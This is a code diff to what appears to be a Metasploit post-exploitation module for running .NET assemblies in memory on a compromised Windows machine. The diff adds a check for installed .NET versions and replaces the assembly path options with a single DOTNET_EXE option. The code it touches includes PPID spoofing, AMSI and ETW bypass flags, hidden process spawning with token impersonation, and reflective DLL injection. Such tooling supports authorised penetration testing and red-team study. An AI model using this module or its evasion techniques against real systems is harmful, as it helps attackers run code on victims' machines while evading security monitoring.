@@ -11,6 +11,7 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Process
   include Msf::Post::Windows::ReflectiveDLLInjection
+  include Msf::Post::Windows::Dotnet
 
   def initialize(info = {})
     super(update_info(info,
@@ -30,13 +31,12 @@ class MetasploitModule < Msf::Post
     ))
     register_options(
       [
-        OptString.new('ASSEMBLY', [true, 'Assembly file name']),
-        OptPath.new('ASSEMBLYPATH', [false, 'Assembly directory', ::File.join(Msf::Config.data_directory, 'execute-assembly')]),
+        OptString.new('DOTNET_EXE', [true, 'Assembly file name']),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
         OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
         OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation',true]),
         OptInt.new('PID', [false, 'Pid  to inject', 0]),
-	OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
+        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
         OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
         OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),
         OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
@@ -49,9 +49,17 @@ class MetasploitModule < Msf::Post
       ]
     )
   end
+  def check_dotnet_version
+    vprint_status("DOTNET VERSIONS:  #{get_dotnet_versions}")
+  end
 
   def run
-    exe_path = gen_exe_path
+    installed_dotnet_versions = get_dotnet_versions
+    vprint_status("Dot Net Versions installed on target: #{installed_dotnet_versions}")
+    if installed_dotnet_versions == []
+      fail_with(Failure::BadConfig, "Target has no .NET framework installed")
+    end
+    exe_path = datastore['DOTNET_EXE']
     if File.file?(exe_path)
       assembly_size = File.size(exe_path)
       if datastore['ARGUMENTS'].nil?
@@ -63,16 +71,6 @@ class MetasploitModule < Msf::Post
     else
       print_bad("Assembly not found #{exe_path}")
     end
-  end
-
-  def gen_exe_path
-    if datastore['ASSEMBLYPATH'] == '' || datastore['ASSEMBLYPATH'].nil?
-      exe_path = ::File.join(Msf::Config.data_directory, 'execute-assembly', datastore['ASSEMBLY'])
-    else
-      exe_path = ::File.join(datastore['ASSEMBLYPATH'], datastore['ASSEMBLY'])
-    end
-    exe_path = ::File.expand_path(exe_path)
-    exe_path
   end
 
   def sanitize_process_name(process_name)
@@ -121,7 +119,7 @@ class MetasploitModule < Msf::Post
       impersonation = false
     end
     process = client.sys.process.execute(process_name, nil, {
-      'Channelized' => channelized, 
+      'Channelized' => channelized,
       'Hidden' => true,
       'UseThreadToken' => impersonation,
       'ParentPid' => datastore['PPID']
@@ -200,7 +198,7 @@ class MetasploitModule < Msf::Post
     int_param_size = 8
     amsi_flag_size = 1
     etw_flag_size = 1
-    exe_path = gen_exe_path
+    exe_path = datastore['DOTNET_EXE']
     assembly_size = File.size(exe_path)
     if datastore['ARGUMENTS'].nil?
       argssize = 1
